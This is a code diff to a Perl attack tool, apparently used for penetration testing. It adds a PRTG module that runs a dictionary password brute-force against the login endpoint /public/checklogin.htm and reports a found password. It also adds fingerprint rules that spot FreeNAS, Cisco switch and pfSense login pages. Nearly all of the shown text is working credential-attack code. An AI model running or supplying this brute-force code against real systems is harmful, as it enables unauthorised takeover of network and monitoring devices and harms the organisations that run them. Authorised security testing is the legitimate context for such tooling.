@@ -446,6 +446,38 @@ if ($module eq "ZKSoftware")
 	close MYINPUT;	
 }#ZKSoftware
 
+if ($module eq "PRTG")
+{
+
+	$headers->header("Content-Type" => "application/x-www-form-urlencoded");		
+	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+	while (my $password=<MYINPUT>)
+	{ 
+		$password =~ s/\n//g; 	
+		my $hash_data = {'username' => $user, 
+				'password' => $password,
+				'guiselect' => "radio"
+				};	
+	
+		my $post_data = convert_hash($hash_data);
+		
+		my $response = $self->dispatch(url => $url."/public/checklogin.htm",method => 'POST',post_data =>$post_data, headers => $headers);
+		my $decoded_response = $response->decoded_content;
+		my $response_headers = $response->headers_as_string;
+		my $status = $response->status_line;
+		
+		print "[+] user:$user password:$password status:$status\n";
+		
+		
+		if (! ($response_headers =~ /error/m)){	 
+			print "\nPRTG: Password encontrado! ($user:$password)\n";
+			last;
+		}
+		
+	}
+	close MYINPUT;	
+}#PRTG
+
 
 if ($module eq "phpmyadmin")
 {
@@ -800,6 +832,16 @@ if($decoded_response =~ /phpmyadmin/i)
 	
 if($decoded_response =~ /Set-Cookie: webvpn/i)
 	{$type=$type."|"."ciscoASA";} 		
+
+if($decoded_response =~ /FreeNAS/i)
+	{$title="FreeNAS";} 			
+
+if($decoded_response =~ /ciscouser/i)
+	{$title="Cisco switch";} 
+
+if($decoded_response =~ /pfsense-logo/i)
+	{$title="Pfsense";} 
+
 		
 
 if($type eq '' && $decoded_response =~ /login/m)
